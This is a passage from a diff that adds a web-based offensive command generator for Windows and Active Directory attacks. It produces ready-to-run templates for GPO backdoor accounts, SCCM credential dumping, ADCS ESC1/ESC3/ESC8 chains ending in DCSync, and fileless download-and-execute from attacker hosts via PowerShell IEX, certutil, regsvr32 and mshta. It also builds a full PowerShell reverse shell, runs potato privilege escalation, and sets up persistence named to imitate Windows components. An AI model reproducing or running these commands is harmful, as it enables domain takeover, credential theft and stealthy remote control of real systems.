+{id:"gpo",type:"tx",label:"--GPOName",desc:"Exact GPO name — from Get-DomainGPO or BloodHound WriteDacl/GenericWrite paths",ph:"Default Domain Policy"}
+],
+build(f,e){let u=e.user||(f.domain?`${f.domain}\\${f.user||"attacker"}`:f.user||"DOMAIN\\attacker");
+return`SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "${u}" --GPOName "${e.gpo||"Default Domain Policy"}"`;}},
+
+"startup-script":{label:"add startup script via GPO",
+tip:"Add malicious startup/logon script to a writable GPO. Executes on computer startup or user login.",
+extra:[
+{id:"script",type:"tx",label:"--ScriptName",desc:"Filename stored in SYSVOL — .bat or .ps1",ph:"update.bat"},
+{id:"contents",type:"tx",label:"--ScriptContents",desc:"Command to execute — add backdoor user, run payload, etc.",ph:"net user /add backdoor Pass123! && net localgroup administrators backdoor /add"},
+{id:"gpo",type:"tx",label:"--GPOName",desc:"Writable GPO name — from BloodHound or Get-DomainGPO",ph:"Default Domain Policy"}
+],
+build(f,e){return`SharpGPOAbuse.exe --AddUserScript --ScriptName "${e.script||"update.bat"}" --ScriptContents "${e.contents||"whoami > C:\\\\out.txt"}" --GPOName "${e.gpo||"Default Domain Policy"}"`;}},
+}},
+
+"sharpsccm":{label:"SCCM (SharpSCCM)",mods:{
+"get-naa":{label:"get NAA credentials",
+tip:"Extract SCCM Network Access Account passwords. NAA creds often reused domain accounts across environments.",
+extra:[
+{id:"mp",type:"tx",label:"-mp (management point)",desc:"SCCM management point hostname or IP — from DNS or SharpSCCM recon",ph:"SCCM01.corp.local"}
+],
+build(f,e){return`SharpSCCM.exe get naa -mp ${e.mp||f.target||"SCCM01"}`;}},
+
+"invoke-admin":{label:"AdminService — code exec on clients",
+tip:"Execute commands on SCCM clients via AdminService REST API. Requires SCCM Full Administrator rights.",
+extra:[
+{id:"device",type:"tx",label:"-d device name",desc:"Target device name — exact match as registered in SCCM",ph:"WORKSTATION01"},
+{id:"cmd",type:"tx",label:"-r command",desc:"Command to run on the remote SCCM client",ph:"powershell -c whoami"}
+],
+build(f,e){return`SharpSCCM.exe invoke admin-service -d ${e.device||"WORKSTATION01"} -r "${e.cmd||"whoami"}"`;}},
+
+"local-secrets":{label:"local — dump secrets",
+tip:"Extract SCCM NAA creds from local WMI/registry. Run ON the SCCM client machine — no network needed.",
+extra:[
+{id:"method",type:"tx",label:"-m method",desc:"wmi (default, uses WMI queries) or disk (reads policy files directly)",ph:"wmi"}
+],
+build(f,e){return`SharpSCCM.exe local secrets -m ${e.method||"wmi"}`;}},
+}},
+
+"certify-win":{label:"ADCS (Certify.exe)",mods:{
+"find":{label:"find — enumerate templates",
+tip:"Windows ADCS enum. Run first to get CA name and template names for ESC chains below.",
+extra:[
+{id:"vuln",type:"cb",main:"/vulnerable",desc:"Filter to only vulnerable templates — saves time in large environments"},
+{id:"ca",type:"tx",label:"/ca",desc:"Filter to specific CA name",ph:"corp-CA"},
+{id:"domain",type:"tx",label:"/domain",desc:"Target domain — defaults to current domain",ph:"corp.local"}
+],
+build(f,e){let fl="";if(e.vuln)fl+=" /vulnerable";if(e.ca)fl+=` /ca:${e.ca}`;if(e.domain)fl+=` /domain:${e.domain}`;
+return`Certify.exe find${fl}`;}},
+
+"esc1-chain":{label:"ESC1 — SAN abuse (full chain)",
+tip:"Windows ESC1: Certify.exe request → openssl convert PEM→PFX → Rubeus asktgt /getcredentials → PTH.",
+extra:[
+{id:"ca",type:"tx",label:"/ca",desc:"CA identifier — format: HOSTNAME\\CA-Name from Certify find output",ph:"DC01\\corp-CA"},
+{id:"template",type:"tx",label:"/template",desc:"Vulnerable template — must have EnrolleeSuppliesSubject. From Certify find",ph:"User"},
+{id:"altname",type:"tx",label:"/altname (UPN to impersonate)",desc:"UPN to embed in cert SAN — Administrator@domain for DA access",ph:"Administrator@corp.local"}
+],
+build(f,e){let d=f.domain||"corp.local";let vic=e.altname||`Administrator@${d}`;let vl=vic.split("@")[0].toLowerCase();
+return[`# Step 0: Find vulnerable templates`,`# Certify.exe find /vulnerable`,``,
+`# Step 1: Request certificate with target UPN in SAN`,
+`Certify.exe request /ca:${e.ca||"DC01\\\\corp-CA"} /template:${e.template||"User"} /altname:${vic}`,
+`# Output: cert.pem (certificate + private key in PEM format)`,``,
+`# Step 2: Convert PEM to PFX (on attacker box or Windows with openssl)`,
+`openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ${vl}.pfx`,
+`# Enter a password when prompted — needed in next step`,``,
+`# Step 3: Request TGT with cert and extract NT hash`,
+`Rubeus.exe asktgt /user:${vic} /certificate:${vl}.pfx /password:PFXPASSWORD /getcredentials /show /nowrap`,
+`# Output: TGT (base64) + NT hash`,``,
+`# Step 4a: Inject TGT`,
+`Rubeus.exe ptt /ticket:BASE64_TGT_FROM_ABOVE`,``,
+`# Step 4b: Or Pass-the-Hash with extracted NT hash`,
+`mimikatz.exe "sekurlsa::pth /user:Administrator /domain:${d} /ntlm:NT_HASH_HERE /run:cmd.exe" "exit"`
+].join("\n");}},
+
+"esc3-chain":{label:"ESC3 — Enrollment Agent (full chain)",
+tip:"Windows ESC3: Get enrollment agent cert → use Certify /onbehalfof → convert PEM→PFX → Rubeus asktgt.",
+extra:[
+{id:"ca",type:"tx",label:"/ca",desc:"CA name — HOSTNAME\\CA-Name format from Certify find",ph:"DC01\\corp-CA"},
+{id:"agent_tpl",type:"tx",label:"enrollment agent template",desc:"Template with Certificate Request Agent EKU — step 1 target",ph:"Enrollment Agent"},
+{id:"target_tpl",type:"tx",label:"target template",desc:"Template to enroll on-behalf-of — Schema v1 templates work by default",ph:"User"},
+{id:"obo",type:"tx",label:"/onbehalfof",desc:"Format: DOMAIN\\\\Username — account to impersonate",ph:"CORP\\\\Administrator"}
+],
+build(f,e){let d=f.domain||"corp.local",ca=e.ca||"DC01\\\\corp-CA";
+return[`# Step 0: Find vulnerable templates`,`# Certify.exe find /vulnerable`,``,
+`# Step 1: Get enrollment agent certificate`,
+`Certify.exe request /ca:${ca} /template:${e.agent_tpl||"Enrollment Agent"}`,
+`# Output: agent.pem`,``,
+`# Step 2: Convert agent PEM to PFX`,
+`openssl pkcs12 -in agent.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out agent.pfx`,``,
+`# Step 3: Request target cert on-behalf-of admin`,
+`Certify.exe request /ca:${ca} /template:${e.target_tpl||"User"} /onbehalfof:${e.obo||d+"\\\\Administrator"} /enrollcert:agent.pfx /enrollcertpw:AGENTPFXPASSWORD`,
+`# Output: admin.pem`,``,
+`# Step 4: Convert admin PEM to PFX`,
+`openssl pkcs12 -in admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx`,``,
+`# Step 5: Get TGT and NT hash`,
+`Rubeus.exe asktgt /user:Administrator /domain:${d} /certificate:admin.pfx /password:PFXPASSWORD /getcredentials /show /nowrap`
+].join("\n");}},
+
+"esc8-chain":{label:"ESC8 — NTLM Relay to ADCS (Windows)",
+tip:"Windows-side ESC8 chain. Relay initiated from Linux. DC cert obtained via certipy relay, used here via Rubeus.",
+extra:[
+{id:"ca_ip",type:"tx",label:"CA web server IP",desc:"Server running AD CS web enrollment (port 80/443)",ph:"192.168.1.20"}
+],
+build(f,e){let d=f.domain||"corp.local",dc=f.dc||"DC_IP",lh=f.lhost||"LHOST",ca_ip=e.ca_ip||dc;
+return[
+`# ESC8 Windows-side chain (relay runs from Linux attacker)`,``,
+`# Step 1 (Linux Terminal 1): Start relay`,
+`certipy relay -target 'http://${ca_ip}' -ca 'corp-CA'`,``,
+`# Step 2 (Linux Terminal 2): Coerce DC`,
+`python3 PetitPotam.py ${lh} ${dc}`,``,
+`# Step 3 (Windows): Copy obtained dc01.pfx to Windows machine, then:`,
+`Rubeus.exe asktgt /user:DC01$ /domain:${d} /certificate:dc01.pfx /password:PFXPASSWORD /getcredentials /ptt /nowrap`,``,
+`# Step 4 (Windows): DCSync with injected DC$ ticket`,
+`mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:${d} /all /csv" "exit"`
+].join("\n");}},
+
+"request":{label:"request — generic cert request",
+tip:"Generic certificate request. Use /altname for ESC1 UPN abuse, /onbehalfof for ESC3 enrollment agent.",
+extra:[
+{id:"ca",type:"tx",label:"/ca",desc:"CA identifier — HOSTNAME\\CA-Name format from Certify find",ph:"DC01\\corp-CA"},
+{id:"template",type:"tx",label:"/template",desc:"Template name from Certify find",ph:"User"},
+{id:"altname",type:"tx",label:"/altname (ESC1 UPN)",desc:"ESC1: UPN to embed in SAN — impersonates this account on auth",ph:"Administrator@corp.local"},
+{id:"onbehalf",type:"tx",label:"/onbehalfof (ESC3)",desc:"ESC3: Enroll on behalf of — format: DOMAIN\\\\Username",ph:"DOMAIN\\\\Administrator"},
+{id:"machineacct",type:"cb",main:"/machineacct",desc:"Request in machine account context — needed for machine certificate templates"}
+],
+build(f,e){let fl=`/ca:${e.ca||"DC01\\\\corp-CA"} /template:${e.template||"User"}`;if(e.altname)fl+=` /altname:${e.altname}`;if(e.onbehalf)fl+=` /onbehalfof:${e.onbehalf}`;if(e.machineacct)fl+=" /machineacct";
+return`Certify.exe request ${fl}`;}},
+}},
+
+"filetransfer-win":{label:"File Transfer",mods:{
+"powershell":{label:"PowerShell — download / exec",
+tip:"IWR saves to disk. DownloadString + IEX = in-memory fileless execution. -ep bypass skips execution policy.",
+extra:[
+{id:"url",type:"tx",label:"URL",desc:"Full URL to download from attacker HTTP server",ph:"http://10.10.14.1/file.exe"},
+{id:"dest",type:"tx",label:"destination",desc:"Local Windows path — Temp folder is usually writable",ph:"C:\\Windows\\Temp\\file.exe"},
+{id:"iex",type:"cb",main:"IEX (in-memory — fileless)",desc:"No file on disk — DownloadString + IEX. Evades AV that scans written files"}
+],
+build(f,e){let url=e.url||`http://${f.lhost||"LHOST"}/file.exe`,dst=e.dest||"C:\\Windows\\Temp\\file.exe";
+if(e.iex)return`powershell -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('${url}')"`;
+return`powershell -ep bypass -c "Invoke-WebRequest -Uri '${url}' -OutFile '${dst}' -UseBasicParsing"\n# Alternative:\npowershell -c "(New-Object Net.WebClient).DownloadFile('${url}','${dst}')"`;}},
+
+"certutil":{label:"certutil — LOLBin download",
+tip:"Built-in Windows binary. -urlcache -split -f is classic syntax. Often logged by security tools.",
+extra:[
+{id:"url",type:"tx",label:"URL",desc:"Full URL to download — HTTP and FTP supported",ph:"http://10.10.14.1/file.exe"},
+{id:"dest",type:"tx",label:"destination",desc:"Local save path",ph:"C:\\Windows\\Temp\\file.exe"},
+{id:"decode",type:"cb",main:"-decode (base64 decode)",desc:"Decode base64-encoded file — use to bypass content filtering on downloads"}
+],
+build(f,e){let url=e.url||`http://${f.lhost||"LHOST"}/file`,dst=e.dest||"C:\\Windows\\Temp\\file.exe";
+if(e.decode)return`certutil.exe -decode ${url} ${dst}`;
+return`certutil.exe -urlcache -split -f ${url} ${dst}`;}},
+
+"bitsadmin":{label:"bitsadmin — LOLBin download",
+tip:"Background Intelligent Transfer. Less monitored than WebClient. Runs as background job.",
+extra:[
+{id:"url",type:"tx",label:"URL",desc:"Full download URL",ph:"http://10.10.14.1/file.exe"},
+{id:"dest",type:"tx",label:"destination",desc:"Local save path",ph:"C:\\Windows\\Temp\\file.exe"}
+],
+build(f,e){let url=e.url||`http://${f.lhost||"LHOST"}/file.exe`,dst=e.dest||"C:\\Windows\\Temp\\file.exe";
+return`bitsadmin /transfer job001 /download /priority normal ${url} ${dst}`;}},
+
+"smb-copy":{label:"SMB copy — from attacker share",
+tip:"Copy from attacker impacket-smbserver. No download tool needed — uses built-in Windows copy.",
+extra:[
+{id:"file",type:"tx",label:"filename",desc:"Filename on attacker SMB share — just filename not full path",ph:"evil.exe"},
+{id:"dest",type:"tx",label:"destination",desc:"Local Windows path to copy to",ph:"C:\\Windows\\Temp\\"},
+{id:"sn",type:"tx",label:"share name",desc:"SMB share name on attacker — must match impacket-smbserver share",ph:"share"}
+],
+build(f,e){let lh=f.lhost||"LHOST",sn=e.sn||"share",file=e.file||"evil.exe",dst=e.dest||"C:\\Windows\\Temp\\";
+return`copy \\\\\\\\${lh}\\\\${sn}\\\\${file} ${dst}\n# Execute directly from UNC:\n\\\\\\\\${lh}\\\\${sn}\\\\${file}`;}},
+
+"regsvr32":{label:"regsvr32 — Squiblydoo",
+tip:"Execute remote SCT COM scriptlet via regsvr32.exe (LOLBin). Classic AppLocker bypass.",
+extra:[
+{id:"url",type:"tx",label:"SCT URL",desc:"URL to .sct COM scriptlet hosted on attacker — contains VBScript/JScript payload",ph:"http://10.10.14.1/evil.sct"}
+],
+build(f,e){return`regsvr32.exe /s /n /u /i:${e.url||`http://${f.lhost||"LHOST"}/evil.sct`} scrobj.dll`;}},
+
+"mshta":{label:"mshta — HTA execution",
+tip:"Execute HTA via mshta.exe (LOLBin). Accepts URL, VBScript:// or JavaScript:// URIs.",
+extra:[
+{id:"url",type:"tx",label:"HTA URL",desc:"URL to .hta file or inline VBScript/JavaScript URI",ph:"http://10.10.14.1/evil.hta"}
+],
+build(f,e){return`mshta.exe ${e.url||`http://${f.lhost||"LHOST"}/evil.hta`}`;}},
+}},
+
+"revshells-win":{label:"Reverse Shells",mods:{
+"ps-rev":{label:"PowerShell reverse shell (victim-side)",
+tip:"Run ON the Windows victim. Connects back to your listener. Start nc -lvnp PORT first.",
+extra:[
+{id:"lh",type:"tx",label:"LHOST",desc:"Your attacker IP — victim connects to this",ph:"10.10.14.1"},
+{id:"lp",type:"tx",label:"LPORT",desc:"Your listener port — must be listening before running this",ph:"4444"}
+],
+build(f,e){let lh=e.lh||f.lhost||"LHOST",lp=e.lp||f.lport||"4444";
+return`powershell -ep bypass -nop -c "$c=New-Object Net.Sockets.TCPClient('${lh}',${lp});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`;}},
+}},
+
+"privesc":{label:"Privesc",mods:{
+"sysinfo":{label:"system info + whoami",
+tip:"Run immediately after getting shell for situational awareness — user, privs, patch level, local admins.",
+extra:[],
+build(f,e){return`whoami /all\nnet localgroup administrators\nsysteminfo\nipconfig /all\nwmic qfe list brief\nwhoami /priv`;}},
+
+"winpeas":{label:"winPEAS — automated enum",
+tip:"Automated Windows privesc checks — unquoted paths, weak permissions, credentials, misconfigs.",
+extra:[
+{id:"cmd",type:"tx",label:"flags",desc:"cmd = cmd output (avoids ANSI issues), fast = skip slow checks, notcolor = no color codes",ph:"cmd fast"},
+{id:"out",type:"tx",label:"output file",desc:"Redirect to file — recommended for large output",ph:"C:\\Windows\\Temp\\peas.txt"}
+],
+build(f,e){return`winPEASx64.exe ${e.cmd||""}${e.out?` > ${e.out}`:""}`;}},
+
+"printspoofer":{label:"PrintSpoofer — SeImpersonate",
+tip:"Abuse SeImpersonatePrivilege via named pipe impersonation. Works on Windows 10 1809 and Server 2019.",
+extra:[
+{id:"cmd",type:"tx",label:"-c command",desc:"Command to run as SYSTEM — verify with whoami, then run payload",ph:"whoami"}
+],
+build(f,e){return`PrintSpoofer.exe -i -c "${e.cmd||"whoami"}"`;}},
+
+"godpotato":{label:"GodPotato — SeImpersonate",
+tip:"SeImpersonatePrivilege abuse. Works Windows 2012–2022. No CLSID hunting needed.",
+extra:[
+{id:"cmd",type:"tx",label:"-cmd",desc:"Command to run as SYSTEM",ph:"cmd /c whoami"}
+],
+build(f,e){return`GodPotato.exe -cmd "${e.cmd||"cmd /c whoami"}"`;}},
+
+"juicypotato":{label:"JuicyPotato — SeImpersonate",
+tip:"SeImpersonatePrivilege via DCOM CLSID. Needs OS-specific CLSID: github.com/ohpe/juicy-potato/tree/master/CLSID",
+extra:[
+{id:"clsid",type:"tx",label:"-c CLSID",desc:"COM CLSID for target OS — must match exact Windows version from ohpe's list",ph:"{e60687f7-01a1-40aa-86ac-db1cbf673334}"},
+{id:"cmd",type:"tx",label:"-a argument",desc:"Argument to cmd.exe — your payload command",ph:"/c net user hacked Hacked123! /add"},
+{id:"port",type:"tx",label:"-l port",desc:"Local COM server port — any free port",ph:"10000"}
+],
+build(f,e){return`JuicyPotato.exe -l ${e.port||"10000"} -c "${e.clsid||"{CLSID}"}" -p C:\\Windows\\System32\\cmd.exe -a "${e.cmd||"/c whoami"}" -t *`;}},
+}},
+
+"persistence":{label:"Persistence",mods:{
+"reg-run":{label:"Registry Run key",
+tip:"HKCU = current user, no admin needed. HKLM = all users + system, requires admin.",
+extra:[
+{id:"name",type:"tx",label:"key name",desc:"Registry value name — use something that resembles a Windows component",ph:"WindowsUpdateCheck"},
+{id:"cmd",type:"tx",label:"command",desc:"Full path to executable — or cmd.exe /c for multi-step",ph:"C:\\Windows\\Temp\\evil.exe"},
+{id:"hklm",type:"cb",main:"HKLM (all users — needs admin)",desc:"HKLM runs for ALL users at login. HKCU runs only for current user"}
+],
+build(f,e){let hive=e.hklm?"HKLM":"HKCU";
+return`reg add ${hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "${e.name||"WindowsUpdateCheck"}" /t REG_SZ /d "${e.cmd||"C:\\\\Windows\\\\Temp\\\\evil.exe"}" /f`;}},
+
+"schtask":{label:"scheduled task",
+tip:"Scheduled task persistence. ONLOGON = any user login. SYSTEM = no user context, max privilege.",
+extra:[
+{id:"name",type:"tx",label:"task name",desc:"Task name — avoid obvious names. Use existing-looking task names",ph:"WinUpdateHelper"},
+{id:"cmd",type:"tx",label:"program path",desc:"Full executable path — or powershell.exe with -c for inline commands",ph:"C:\\Windows\\Temp\\evil.exe"},
+{id:"trigger",type:"tx",label:"/sc trigger",desc:"ONLOGON (any user login), ONSTART (boot), DAILY, ONCE, MINUTE",ph:"ONLOGON"},
+{id:"user",type:"tx",label:"/ru user",desc:"Run-as context: SYSTEM (highest), NETWORK SERVICE, or specific username",ph:"SYSTEM"}
+],
+build(f,e){return`schtasks /create /tn "${e.name||"WinUpdateHelper"}" /tr "${e.cmd||"C:\\\\Windows\\\\Temp\\\\evil.exe"}" /sc ${e.trigger||"ONLOGON"} /ru ${e.user||"SYSTEM"} /f`;}},
+
+"service":{label:"create service",
+tip:"Windows service for SYSTEM persistence. Note spaces after = in sc create — required syntax.",
+extra:[
+{id:"name",type:"tx",label:"service name",desc:"Use a name resembling a legitimate Windows service",ph:"WinHttpSvc"},
+{id:"cmd",type:"tx",label:"binary path",desc:"Full EXE path — must be a proper Windows service EXE or use cmd.exe /c wrapper",ph:"C:\\Windows\\Temp\\evil.exe"}
+],
+build(f,e){return`sc create ${e.name||"WinHttpSvc"} binPath= "${e.cmd||"C:\\\\Windows\\\\Temp\\\\evil.exe"}" start= auto type= own\nsc start ${e.name||"WinHttpSvc"}`;}},
+}},
+}
+};
+
+// ── Runtime ──────────────────────────────────────────────────────────────────
+let curOS="linux",selTool=null,selMod=null;
+
+function switchOS(os,btn){
+  curOS=os;selTool=null;selMod=null;
+  document.getElementById("tab-linux").className="os-tab"+(os==="linux"?" t-linux":"");
+  document.getElementById("tab-win").className="os-tab"+(os==="windows"?" t-win":"");
+  document.getElementById("gen-btn").className=`gen-btn ${os==="windows"?"gen-win":"gen-linux"}`;
+  document.getElementById("out-wrap").style.display="none";
+  document.getElementById("empty-state").style.display="block";
+  renderTools();clearMods();
+}
+
+function gv(id){return document.getElementById(id)?.value?.trim()||"";}
+function getF(){
+  return{
+    user:gv("f_user"),pass:gv("f_pass"),hash:gv("f_hash"),aes:gv("f_aes"),
+    domain:gv("f_domain"),dc:gv("f_dc"),dch:gv("f_dch"),target:gv("f_target"),
+    lhost:gv("f_lhost"),lport:gv("f_lport")
+  };
+}
+
+function renderTools(){
+  let list=document.getElementById("tool-list");list.innerHTML="";
+  let ac=curOS==="windows"?"sel-win":"sel-linux";
+  Object.entries(T[curOS]).forEach(([k,v])=>{
+    let b=document.createElement("button");
+    b.className="tool-btn"+(selTool===k?" "+ac:"");
+    b.innerHTML=`<span class="t-dot"></span>${v.label}`;
+    b.onclick=()=>{selTool=k;selMod=null;renderTools();renderMods();clearExtras();document.getElementById("out-wrap").style.display="none";document.getElementById("empty-state").style.display="block";};
+    list.appendChild(b);
+  });
+}
+
+function clearMods(){document.getElementById("module-card").style.display="none";clearExtras();}
+function clearExtras(){document.getElementById("extras-card").style.display="none";}
+
+function renderMods(){
+  let mc=document.getElementById("module-card"),pg=document.getElementById("pill-grid");
+  if(!selTool){mc.style.display="none";return;}
+  mc.style.display="block";pg.innerHTML="";
+  let ac=curOS==="windows"?"sel-win":"sel-linux";
+  Object.entries(T[curOS][selTool].mods).forEach(([k,v])=>{
+    let b=document.createElement("button");
+    b.className="pill"+(selMod===k?" "+ac:"");
+    b.textContent=v.label;
+    b.onclick=()=>{selMod=k;renderMods();renderExtras();document.getElementById("out-wrap").style.display="none";document.getElementById("empty-state").style.display="block";};
+    pg.appendChild(b);
+  });
+}
+
+function renderExtras(){
+  let ec=document.getElementById("extras-card"),eg=document.getElementById("extras-grid");
+  if(!selTool||!selMod){ec.style.display="none";return;}
+  let mod=T[curOS][selTool].mods[selMod];
+  if(!mod.extra||!mod.extra.length){ec.style.display="none";return;}
+  ec.style.display="block";eg.innerHTML="";
+  mod.extra.forEach(field=>{
+    let el=document.createElement("div");
+    if(field.type==="cb"){
+      el.className="cb-row";
+      let desc=field.desc?`<span class="cb-desc">${field.desc}</span>`:"";
+      el.innerHTML=`<input type="checkbox" id="ex_${field.id}"><div class="cb-label"><span class="cb-main">${field.main}</span>${desc}</div>`;
+    } else {
+      el.className="ef-field";
+      let desc=field.desc?`<div class="ef-desc">${field.desc}</div>`:"";
+      el.innerHTML=`<div class="ef-label">${field.label||field.main||""}</div>${desc}<input class="ef-input" id="ex_${field.id}" placeholder="${field.ph||""}" autocomplete="off" spellcheck="false">`;
+    }
+    eg.appendChild(el);
+  });
+}
+
+function getExtras(){
+  if(!selTool||!selMod)return{};
+  let mod=T[curOS][selTool].mods[selMod],out={};
+  if(!mod.extra)return out;
+  mod.extra.forEach(fld=>{
+    let el=document.getElementById("ex_"+fld.id);
+    if(!el)return;
+    out[fld.id]=fld.type==="cb"?el.checked:el.value.trim();
+  });
+  return out;
+}
+
+function generate(){
+  if(!selTool||!selMod)return;
+  let cmd=T[curOS][selTool].mods[selMod].build(getF(),getExtras());
+  document.getElementById("out-pre").textContent=cmd;
+  document.getElementById("tip-bar").textContent="\u24D8  "+T[curOS][selTool].mods[selMod].tip;
+  document.getElementById("out-wrap").style.display="block";
+  document.getElementById("empty-state").style.display="none";
+  document.getElementById("out-wrap").scrollIntoView({behavior:"smooth",block:"nearest"});
+}
+
+function copyCmd(){
+  let text=document.getElementById("out-pre").textContent;
+  let btn=document.getElementById("copy-btn");
+  navigator.clipboard.writeText(text).then(()=>{
+    btn.textContent="Copied!";btn.style.color="var(--green)";btn.style.borderColor="var(--green-border)";btn.style.background="var(--green-bg)";
+    setTimeout(()=>{btn.textContent="Copy";btn.style.color="";btn.style.borderColor="";btn.style.background="";},2000);
+  }).catch(()=>{
+    let r=document.createRange();r.selectNode(document.getElementById("out-pre"));
+    window.getSelection().removeAllRanges();window.getSelection().addRange(r);
+    document.execCommand("copy");
+  });
+}
+
+renderTools();
+</script>
+</body>
+</html>
